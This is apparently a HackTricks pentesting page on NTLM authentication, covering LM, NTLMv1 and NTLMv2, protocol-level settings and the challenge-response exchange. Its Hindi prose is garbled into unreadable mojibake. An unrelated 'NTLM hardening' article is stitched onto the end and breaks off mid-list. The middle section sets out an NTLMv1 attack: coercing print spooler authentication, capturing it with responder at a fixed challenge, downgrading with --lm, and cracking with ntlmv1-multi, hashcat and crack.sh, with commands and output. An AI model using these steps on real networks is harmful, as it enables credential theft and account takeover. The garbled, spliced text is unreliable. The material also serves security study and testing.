# NTLM

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЗрдЪреНрдЫрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ рд╕рдВрдЧреНрд░рд╣ [**NFTs**](https://opensea.io/collection/the-peass-family)
* рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ рдореБрдЭреЗ **Twitter** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рджреНрд╡рд╛рд░рд╛ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛред**

</details>

## рдореВрд▓рднреВрдд рдЬрд╛рдирдХрд╛рд░реА

**NTLM рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕**: рдбреЛрдореЗрди рдирд╛рдо (рдпрджрд┐ рдХреЛрдИ рд╣реЛ), рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рд╣реИрд╢ред

**LM** рдХреЗрд╡рд▓ **Windows XP рдФрд░ рд╕рд░реНрд╡рд░ 2003** рдореЗрдВ **рд╕рдХреНрд╖рдо** рд╣реИ (LM рд╣реИрд╢ рдХреЛ рдХреНрд░реИрдХ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ)ред LM рд╣реИрд╢ AAD3B435B51404EEAAD3B435B51404EE рдпрд╣ рджрд░реНрд╢рд╛рддрд╛ рд╣реИ рдХрд┐ LM рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рд╣реЛ рд░рд╣рд╛ рд╣реИ (рдЦрд╛рд▓реА рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХрд╛ LM рд╣реИрд╢ рд╣реИ)ред

рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ **Kerberos** рдХрд╛ рдЙрдкрдпреЛрдЧ рд╣реЛрддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП NTLM рдХрд╛ рдЙрдкрдпреЛрдЧ рдХреЗрд╡рд▓ рддрднреА рд╣реЛрдЧрд╛ рдЬрдм **рдХреЛрдИ Active Directory рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИ**, **рдбреЛрдореЗрди рдореМрдЬреВрдж рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИ**, **Kerberos рдХрд╛рдо рдирд╣реАрдВ рдХрд░ рд░рд╣рд╛ рд╣реЛрддрд╛ рд╣реИ** (рдмреБрд░реА рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди) рдпрд╛ **рдХреНрд▓рд╛рдЗрдВрдЯ** рдЬреЛ IP рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╡реИрдз рд╣реЛрд╕реНрдЯ-рдирд╛рдо рдХреА рдмрдЬрд╛рдп рдХрдиреЗрдХреНрдЯ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддрд╛ рд╣реИред

рдПрдХ **NTLM рдкреНрд░рдорд╛рдгреАрдХрд░рдг** рдХреЗ **рдиреЗрдЯрд╡рд░реНрдХ рдкреИрдХреЗрдЯ** рдореЗрдВ **рд╣реЗрдбрд░** "**NTLMSSP**" рд╣реЛрддрд╛ рд╣реИред

рдкреНрд░реЛрдЯреЛрдХреЙрд▓: LM, NTLMv1 рдФрд░ NTLMv2 рдХреЛ DLL %windir%\Windows\System32\msv1\_0.dll рдореЗрдВ рд╕рдорд░реНрдерд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ

## LM, NTLMv1 рдФрд░ NTLMv2

рдЖрдк рдЬрд╛рдВрдЪ рдФрд░ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХреМрди рд╕рд╛ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдЙрдкрдпреЛрдЧ рд╣реЛрдЧрд╛:

### GUI

_secpol.msc_ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВ -> рд╕реНрдерд╛рдиреАрдп рдиреАрддрд┐рдпрд╛рдБ -> рд╕реБрд░рдХреНрд╖рд╛ рд╡рд┐рдХрд▓реНрдк -> рдиреЗрдЯрд╡рд░реНрдХ рд╕реБрд░рдХреНрд╖рд╛: LAN рдкреНрд░рдмрдВрдзрдХ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╕реНрддрд░ред 6 рд╕реНрддрд░ рд╣реИрдВ (0 рд╕реЗ 5 рддрдХ).

![](<../../.gitbook/assets/image (92).png>)

### рд░рдЬрд┐рд╕реНрдЯреНрд░реА

рдпрд╣ рд╕реНрддрд░ 5 рд╕реЗрдЯ рдХрд░реЗрдЧрд╛:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
рд╕рдВрднрд╛рд╡рд┐рдд рдорд╛рди:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## рдореВрд▓ NTLM рдбреЛрдореЗрди рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдпреЛрдЬрдирд╛

1. **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рдЕрдкрдиреЗ **рдкреНрд░рдорд╛рдгрдкрддреНрд░** рдкреНрд░рд╕реНрддреБрдд рдХрд░рддрд╛ рд╣реИ
2. рдХреНрд▓рд╛рдЗрдВрдЯ рдорд╢реАрди **рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдЕрдиреБрд░реЛрдз** рднреЗрдЬрддреА рд╣реИ рдФрд░ **рдбреЛрдореЗрди рдирд╛рдо** рдФрд░ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо** рднреЗрдЬрддреА рд╣реИ
3. **рд╕рд░реНрд╡рд░** рдЪреБрдиреМрддреА рднреЗрдЬрддрд╛ рд╣реИ
4. **рдХреНрд▓рд╛рдЗрдВрдЯ** рдЪреБрдиреМрддреА рдХреЛ **рдкрд╛рд╕рд╡рд░реНрдб рдХреА рд╣реИрд╢** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рднреЗрдЬрддрд╛ рд╣реИ
5. **рд╕рд░реНрд╡рд░** **рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░** рдХреЛ **рдбреЛрдореЗрди рдирд╛рдо, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо, рдЪреБрдиреМрддреА рдФрд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛** рднреЗрдЬрддрд╛ рд╣реИред рдпрджрд┐ **рдХреЛрдИ рд╕рдХреНрд░рд┐рдп рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛** рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдирд╣реАрдВ рд╣реИ рдпрд╛ рдбреЛрдореЗрди рдирд╛рдо рд╕рд░реНрд╡рд░ рдХрд╛ рдирд╛рдо рд╣реИ, рддреЛ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рд╕реНрдерд╛рдиреАрдп рд░реВрдк рд╕реЗ рдЬрд╛рдВрдЪреЗ рдЬрд╛рддреЗ рд╣реИрдВред
6. **рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░** рдЬрд╛рдВрдЪрддрд╛ рд╣реИ рдХрд┐ рдХреНрдпрд╛ рд╕рдм рдХреБрдЫ рд╕рд╣реА рд╣реИ рдФрд░ рд╕рд░реНрд╡рд░ рдХреЛ рдЬрд╛рдирдХрд╛рд░реА рднреЗрдЬрддрд╛ рд╣реИ

**рд╕рд░реНрд╡рд░** рдФрд░ **рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░** рдХреЛ **рдиреЗрдЯрд▓реЙрдЧрди** рд╕рд░реНрд╡рд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ **рд╕реБрд░рдХреНрд╖рд┐рдд рдЪреИрдирд▓** рдмрдирд╛рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд╣реЛрддреА рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░ рдХреЛ рд╕рд░реНрд╡рд░ рдХрд╛ рдкрд╛рд╕рд╡рд░реНрдб рдкрддрд╛ рд╣реЛрддрд╛ рд╣реИ (рдпрд╣ **NTDS.DIT** рдбреЗрдЯрд╛рдмреЗрд╕ рдореЗрдВ рд╣реЛрддрд╛ рд╣реИ)ред

### рд╕реНрдерд╛рдиреАрдп NTLM рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдпреЛрдЬрдирд╛

рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдЙрд╕реА рддрд░рд╣ рд╣реЛрддрд╛ рд╣реИ рдЬреИрд╕рд╛ **рдкрд╣рд▓реЗ рдЙрд▓реНрд▓рд┐рдЦрд┐рдд рд╣реИ рд▓реЗрдХрд┐рди** **рд╕рд░реНрд╡рд░** рдХреЛ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рд╣реИрд╢** рдХрд╛ рдкрддрд╛ рд╣реЛрддрд╛ рд╣реИ рдЬреЛ **SAM** рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддрд╛ рд╣реИред рдЗрд╕рд▓рд┐рдП, рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░ рдХреА рдЬрдЧрд╣ рдкреВрдЫрдиреЗ рдХреА рдмрдЬрд╛рдп, **рд╕рд░реНрд╡рд░ рдЦреБрдж рдЬрд╛рдВрдЪреЗрдЧрд╛** рдХрд┐ рдХреНрдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкреНрд░рдорд╛рдгрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред

### NTLMv1 рдЪреБрдиреМрддреА

**рдЪреБрдиреМрддреА рдХреА рд▓рдВрдмрд╛рдИ 8 рдмрд╛рдЗрдЯ** рд╣реЛрддреА рд╣реИ рдФрд░ **рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ 24 рдмрд╛рдЗрдЯ** рд▓рдВрдмреА рд╣реЛрддреА рд╣реИред

**рд╣реИрд╢ NT (16 рдмрд╛рдЗрдЯ)** рдХреЛ **3 рд╣рд┐рд╕реНрд╕реЛрдВ рдореЗрдВ рдмрд╛рдВрдЯрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдкреНрд░рддреНрдпреЗрдХ 7 рдмрд╛рдЗрдЯ** рдХрд╛ (7B + 7B + (2B+0x00\*5)): **рдЕрдВрддрд┐рдо рд╣рд┐рд╕реНрд╕рд╛ рд╢реВрдиреНрдпреЛрдВ рд╕реЗ рднрд░рд╛ рд╣реЛрддрд╛ рд╣реИ**ред рдлрд┐рд░, **рдЪреБрдиреМрддреА** рдХреЛ рдкреНрд░рддреНрдпреЗрдХ рд╣рд┐рд╕реНрд╕реЗ рдХреЗ рд╕рд╛рде **рдЕрд▓рдЧ-рдЕрд▓рдЧ рд░реВрдк рдореЗрдВ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ** рдФрд░ **рдкрд░рд┐рдгрд╛рдорд╕реНрд╡рд░реВрдк** рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рдмрд╛рдЗрдЯреНрд╕ **рдЬреЛрдбрд╝реА рдЬрд╛рддреА рд╣реИрдВ**ред рдХреБрд▓: 8B + 8B + 8B = 24 рдмрд╛рдЗрдЯред

**рд╕рдорд╕реНрдпрд╛рдПрдВ**:

* **рдпрд╛рджреГрдЪреНрдЫрд┐рдХрддрд╛ рдХреА рдХрдореА**
* 3 рд╣рд┐рд╕реНрд╕реЛрдВ рдХреЛ **рдЕрд▓рдЧ-рдЕрд▓рдЧ рд╣рдорд▓рд╛** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ NT рд╣реИрд╢ рдкрддрд╛ рд▓рдЧрд╛рдпрд╛ рдЬрд╛ рд╕рдХреЗ
* **DES рдХреЛ рддреЛрдбрд╝рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**
* 3 рд╡реЗрдВ рдХреБрдВрдЬреА рдореЗрдВ рд╣рдореЗрд╢рд╛ **5 рд╢реВрдиреНрдп** рд╣реЛрддреЗ рд╣реИрдВред
* **рдПрдХ рд╣реА рдЪреБрдиреМрддреА** рджрд┐рдП рдЬрд╛рдиреЗ рдкрд░ **рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛** **рд╕рдорд╛рди** рд╣реЛрдЧреАред рдЗрд╕рд▓рд┐рдП, рдЖрдк рдкреАрдбрд╝рд┐рдд рдХреЛ **рдЪреБрдиреМрддреА** рдХреЗ рд░реВрдк рдореЗрдВ рд╕реНрдЯреНрд░рд┐рдВрдЧ "**1122334455667788**" рджреЗ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЛ **рдкреВрд░реНрд╡-рдЧрдгрд┐рдд рдЗрдВрджреНрд░рдзрдиреБрд╖** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╣рдорд▓рд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

### NTLMv1 рд╣рдорд▓рд╛

рдЖрдЬрдХрд▓ рдЕрдирд┐рдпрдВрддреНрд░рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХреЗ рд╕рд╛рде рд╡рд╛рддрд╛рд╡рд░рдг рдвреВрдВрдврд╝рдирд╛ рдХрдо рд╣реЛ рд░рд╣рд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдЗрд╕рдХрд╛ рдпрд╣ рдорддрд▓рдм рдирд╣реАрдВ рд╣реИ рдХрд┐ рдЖрдк **рдкреНрд░рд┐рдВрдЯ рд╕реНрдкреВрд▓рд░ рд╕реЗрд╡рд╛** рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗред

рдЖрдк AD рдкрд░ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдХреБрдЫ рдкреНрд░рдорд╛рдгрдкрддреНрд░ / рд╕рддреНрд░реЛрдВ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдкреНрд░рд┐рдВрдЯрд░ рдХреЛ рдкреНрд░рдорд╛рдгреАрдХреГрдд рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рдХреБрдЫ **рдЕрдкрдиреЗ рдирд┐рдпрдВрддреНрд░рдг рдХреЗ рддрд╣рдд рд╣реЛрд╕реНрдЯ** рдХреЗ рдЦрд┐рд▓рд╛рдл рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╣ рд╕рдХрддреЗ рд╣реИрдВред рдлрд┐рд░, `metasploit auxiliary/server/capture/smb` рдпрд╛ `responder` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк **рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдЪреБрдиреМрддреА рдХреЛ 1122334455667788** рдкрд░ рд╕реЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░рдпрд╛рд╕ рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рдпрджрд┐ рдпрд╣ **NTLMv1** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ рддреЛ рдЖрдк рдЗрд╕реЗ **рддреЛрдбрд╝ рд╕рдХреЗрдВрдЧреЗ**ред\
рдпрджрд┐ рдЖрдк `responder` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣реЗ рд╣реИрдВ рддреЛ рдЖрдк **рдкреНрд░рдорд╛рдгреАрдХрд░рдг** рдХреЛ **рдбрд╛рдЙрдирдЧреНрд░реЗрдб** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рдзреНрд╡рдЬ `--lm`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
_рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЗрд╕ рддрдХрдиреАрдХ рдХреЗ рд▓рд┐рдП рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ NTLMv1 рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП (NTLMv2 рдорд╛рдиреНрдп рдирд╣реАрдВ рд╣реИ)ред_

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдкреНрд░рд┐рдВрдЯрд░ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рджреМрд░рд╛рди рдХрдВрдкреНрдпреВрдЯрд░ рдЦрд╛рддрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдЧрд╛, рдФрд░ рдХрдВрдкреНрдпреВрдЯрд░ рдЦрд╛рддреЗ рдореЗрдВ **рд▓рдВрдмрд╛ рдФрд░ рдпрд╛рджреГрдЪреНрдЫрд┐рдХ рдкрд╛рд╕рд╡рд░реНрдб** рдХрд╛ рдЙрдкрдпреЛрдЧ рд╣реЛрддрд╛ рд╣реИ рдЬрд┐рд╕реЗ рдЖрдк **рд╕рд╛рдорд╛рдиреНрдп рд╢рдмреНрджрдХреЛрд╢** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рддреЛрдбрд╝рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рдирд╣реАрдВ рд╣реЛрдВрдЧреЗ**ред рд▓реЗрдХрд┐рди **NTLMv1** рдкреНрд░рдорд╛рдгреАрдХрд░рдг **DES рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ** ([рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдпрд╣рд╛рдВ](./#ntlmv1-challenge)), рдЗрд╕рд▓рд┐рдП DES рдХреЛ рддреЛрдбрд╝рдиреЗ рдХреЗ рд▓рд┐рдП рдХреБрдЫ рд╡рд┐рд╢реЗрд╖ рд╕реЗрд╡рд╛рдУрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк рдЗрд╕реЗ рддреЛрдбрд╝ рд╕рдХреЗрдВрдЧреЗ (рдЖрдк [https://crack.sh/](https://crack.sh) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП)ред

### hashcat рдХреЗ рд╕рд╛рде NTLMv1 рд╣рдорд▓рд╛

NTLMv1 рдХреЛ рдПрдирдЯреАрдПрд▓рдПрдорд╡рди рдорд▓реНрдЯреА рдЯреВрд▓ [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) рдХреЗ рд╕рд╛рде рддреЛрдбрд╝рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рд╣реИрд╢рдХреИрдЯ рдХреЗ рд╕рд╛рде рддреЛрдбрд╝рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдЖрджреЗрд╢
```
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
``` would output the below:

```
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
# рдПрдирдЯреАрдПрд▓рдПрдо (NTLM) рд╣рд╛рд░реНрдбрдирд┐рдВрдЧ

рдПрдирдЯреАрдПрд▓рдПрдо (NTLM) рдПрдХ рдкреНрд░рдореБрдЦ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рд╣реИ рдЬреЛ рдорд╛рдЗрдХреНрд░реЛрд╕реЙрдлреНрдЯ рд╡рд┐рдВрдбреЛрдЬ рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдо рдкрд░ рдЙрдкрдпреЛрдЧ рд╣реЛрддрд╛ рд╣реИред рдпрд╣ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдЙрдирдХреЗ рдкрд╣рдЪрд╛рди рдХреЛ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдирдХреЗ рдкрд╛рд╕рд╡рд░реНрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред

рдЗрд╕ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдореЗрдВ, рд╣рдо рдПрдирдЯреАрдПрд▓рдПрдо рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рджрд╛рди рдХрд░реЗрдВрдЧреЗ рдФрд░ рд╡рд┐рдВрдбреЛрдЬ рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдо рдкрд░ рдПрдирдЯреАрдПрд▓рдПрдо рдХреЛ рд╣рд╛рд░реНрдбрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреБрдЫ рд╕реБрд░рдХреНрд╖рд╛ рдЙрдкрд╛рдпреЛрдВ рдХреЛ рд╕рдордЭрд╛рдПрдВрдЧреЗред

## рд╡рд┐рд╖рдп

1. [рдПрдирдЯреАрдПрд▓рдПрдо рдХрд╛рд░реНрдпрдкреНрд░рдгрд╛рд▓реА](#рдПрдирдЯреАрдПрд▓рдПрдо-рдХрд╛рд░реНрдпрдкреНрд░рдгрд╛рд▓реА)
2. [рдПрдирдЯреАрдПрд▓рдПрдо рдХреЗ рд╕реБрд░рдХреНрд╖рд╛ рдЪреБрдиреМрддрд┐рдпрд╛рдБ](#рдПрдирдЯреАрдПрд▓рдПрдо-рдХреЗ-рд╕реБрд░рдХреНрд╖рд╛-рдЪреБрдиреМрддрд┐рдпрд╛рдБ)
3. [рдПрдирдЯреАрдПрд▓рдПрдо рд╣рд╛рд░реНрдбрдирд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рдЙрдкрд╛рдп](#рдПрдирдЯреАрдПрд▓рдПрдо-рд╣рд╛рд░реНрдбрдирд┐рдВрдЧ-рдХреЗ-рд▓рд┐рдП-рдЙрдкрд╛рдп)
4. [рд╕рдВрдЧреНрд░рд╣реАрдд рдкрд╛рда](#рд╕рдВрдЧреНрд░рд╣реАрдд-рдкрд╛рда)

## рдПрдирдЯреАрдПрд▓рдПрдо рдХрд╛рд░реНрдпрдкреНрд░рдгрд╛рд▓реА

рдПрдирдЯреАрдПрд▓рдПрдо рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рддреАрди рдЪрд░рдгреЛрдВ рдореЗрдВ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ:

1. **рд╡рд┐рдиреНрдпрд╛рд╕ (Negotiation)**: рдХреНрд▓рд╛рдЗрдВрдЯ рдФрд░ рд╕рд░реНрд╡рд░ рдХреЗ рдмреАрдЪ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╢реБрд░реВ рд╣реЛрддреА рд╣реИ рдФрд░ рд╡рд┐рдиреНрдпрд╛рд╕ рдЪрд░рдг рдореЗрдВ рдХреНрд▓рд╛рдЗрдВрдЯ рдФрд░ рд╕рд░реНрд╡рд░ рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдФрд░ рд╣реИрд╢ рдЕрд▓реНрдЧреЛрд░рд┐рджрдо рдХреЗ рд▓рд┐рдП рд╕рдордЭреМрддрд╛ рдХрд░рддреЗ рд╣реИрдВред
2. **рдЪреБрдиреМрддреА (Challenge)**: рд╕рд░реНрд╡рд░ рдПрдХ рдЪреБрдиреМрддреА рдмрдирд╛рддрд╛ рд╣реИ рдФрд░ рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЛ рдЙрд╕реЗ рд╣рд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдкрдиреЗ рдкрд╛рд╕рд╡рд░реНрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реЛрддрд╛ рд╣реИред
